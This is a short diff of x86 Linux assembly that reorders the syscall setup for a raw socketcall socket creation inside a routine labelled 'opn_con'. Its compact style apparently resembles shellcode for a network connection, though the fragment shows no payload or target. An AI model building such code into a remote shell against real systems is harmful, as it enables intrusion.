@@ -204,15 +204,15 @@ opn_con:
       mov    ebx, [ebp+p_out+4]    
       int    0x80   
       
-      ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
-      push   SYS_socketcall
-      pop    eax      
+      ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);     
       push   SYS_SOCKET
       pop    ebx
       push   edx               ; protocol = IPPROTO_IP
       push   ebx               ; type     = SOCK_STREAM
       push   2                 ; family   = AF_INET
       mov    ecx, esp          ; ecx      = &args
+      push   SYS_socketcall
+      pop    eax       
       int    0x80 
       stosd                    ; save socket
 
